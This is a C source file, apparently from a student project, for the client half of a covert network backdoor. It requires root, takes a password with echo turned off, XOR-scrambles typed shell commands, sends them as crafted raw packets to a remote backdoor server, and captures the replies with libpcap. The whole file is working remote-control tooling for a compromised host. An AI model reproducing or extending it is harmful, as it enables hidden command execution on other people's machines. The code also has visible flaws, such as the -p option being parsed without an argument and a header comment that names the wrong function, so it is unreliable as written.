#include "backdoor-client.h"
/*--------------------------------------------------------------------------------------------------------------------
-- FUNCTION: main
-- 
-- DATE: 2014/09/06
-- 
-- REVISIONS: (Date and Description)
-- 
-- DESIGNER: Luke Tao, Ian Lee
-- 
-- PROGRAMMER: Luke Tao, Ian Lee
-- 
-- INTERFACE: int main(int argc, char **argv)
-- 
-- RETURNS: 0 for ok, 1 for error
-- 
-- NOTES: main driver function for client program
----------------------------------------------------------------------------------------------------------------------*/
int main(int argc, char **argv)
{
	/* Check to see if user is root */
	if (geteuid() != USER_ROOT)
	{
		printf("\nYou need to be root to run this.\n\n");
    		exit(0);
	}

	client.dst_port = DEFAULT_PORT;
	
	if(parse_options(argc, argv) < 0)
		exit(1);
	
	startClient();

	return 0;
}
/*--------------------------------------------------------------------------------------------------------------------
-- FUNCTION: startClient
-- 
-- DATE: 2014/09/06
-- 
-- REVISIONS: (Date and Description)
-- 
-- DESIGNER: Luke Tao, Ian Lee
-- 
-- PROGRAMMER: Luke Tao, Ian Lee
-- 
-- INTERFACE: int startClient()
-- 
-- RETURNS: 0, not important
-- 
-- NOTES: creates thread for processing user input; and starts packet capture
----------------------------------------------------------------------------------------------------------------------*/
int startClient()
{
	
	pcap_t * nic_handle = NULL;
	struct bpf_program fp;
	pthread_t user_thread;

	//start libpcap to display results
	pthread_create(&user_thread, NULL, process_user, (void *) &client);
	startPacketCapture(nic_handle, fp, FROM_SERVER, client.server_host, client.dst_port);
	
	stopPacketCapture(nic_handle, fp);
	return 0;
}
/*--------------------------------------------------------------------------------------------------------------------
-- FUNCTION: process_user
-- 
-- DATE: 2014/09/06
-- 
-- REVISIONS: (Date and Description)
-- 
-- DESIGNER: Luke Tao, Ian Lee
-- 
-- PROGRAMMER: Luke Tao, Ian Lee
-- 
-- INTERFACE: void * process_user (void * arg)
-- 
-- RETURNS: 0, not important
-- 
-- NOTES: Takes in user input, encrypts commands and sends them.
----------------------------------------------------------------------------------------------------------------------*/
void * process_user (void * arg)
{
	struct client * client = (struct client *) arg;

	char buffer[BUF_LENGTH];
	int quit = FALSE;
	int password_entered = FALSE;
	
	//Password echo set to off	
	struct termios initial_rsettings, new_rsettings;
	
	tcgetattr(fileno(stdin), &initial_rsettings);
	new_rsettings = initial_rsettings;
	new_rsettings.c_lflag &= ~ECHO;

	while(!quit)
	{
		// First time iteration
		if(!password_entered)
		{

			printf("Enter a password: ");
			
			tcsetattr(fileno(stdin), TCSAFLUSH, &new_rsettings);
			get_line(buffer, BUF_LENGTH, stdin);
			tcsetattr(fileno(stdin), TCSANOW, &initial_rsettings);
			strcpy(client->password, buffer);

			password_entered = TRUE;
			
			memset(buffer, 0, sizeof(buffer));
		}
		//read input
		printf("\nEnter a command: ");
		strcpy(client->command, get_line(buffer, BUF_LENGTH, stdin));

		if(strcmp(client->command, "quit") == 0)
		{
			quit = TRUE;
		}
		memset(buffer, 0, sizeof(buffer));

		sprintf(buffer, "%s %d %s%s%s", client->password, SERVER_MODE, CMD_START, client->command, CMD_END);
		printf("Sending data: %s\n", buffer);
		//Encrypt the data

		send_packet(xor_cipher(buffer, strlen(buffer)), strlen(buffer), get_ip_addr(NETWORK_INT), client->server_host, client->dst_port);
		
		//clear buffer
		memset(client->command, 0, BUF_LENGTH);
		//sleep to allow for response before prompting for next command
		usleep(2500000);
	
	}
	return 0;
}
/*--------------------------------------------------------------------------------------------------------------------
-- FUNCTION: parse_options
-- 
-- DATE: 2014/09/06
-- 
-- REVISIONS: (Date and Description)
-- 
-- DESIGNER: Luke Tao, Ian Lee
-- 
-- PROGRAMMER: Luke Tao, Ian Lee
-- 
-- INTERFACE: int parse_options(int argc, char **argv)
-- 
-- RETURNS: 0 for it worked, -1 for error
-- 
-- NOTES: Grabs command line arguments to use as values.
----------------------------------------------------------------------------------------------------------------------*/
int parse_options(int argc, char **argv)
{
	char c;

	while ((c = getopt (argc, argv, "a:p")) != -1)
	{
		switch(c)
		{
			case 'a':
				client.server_host = optarg;
				break;
			case 'p':
				client.dst_port = atoi(optarg);
				break;
			case '?':
			default:
				fprintf(stderr, "Must add a server host.\n");
				usage(argv[0], CLIENT_MODE);
				return -1;
		}
	}
	return 0;

}
/*--------------------------------------------------------------------------------------------------------------------
-- FUNCTION: print_server_info
-- 
-- DATE: 2014/09/06
-- 
-- REVISIONS: (Date and Description)
-- 
-- DESIGNER: Luke Tao, Ian Lee
-- 
-- PROGRAMMER: Luke Tao, Ian Lee
-- 
-- INTERFACE: void print_server_info()
-- 
-- RETURNS: void
-- 
-- NOTES: Prints out information on Client variables
----------------------------------------------------------------------------------------------------------------------*/
void print_client_info()
{
	fprintf(stderr, "Server's IP host: %s\n", client.server_host);
	fprintf(stderr, "Server's destination port: %d\n", client.dst_port);
	fprintf(stderr, "Sending cmd: %s\n", client.command);
}
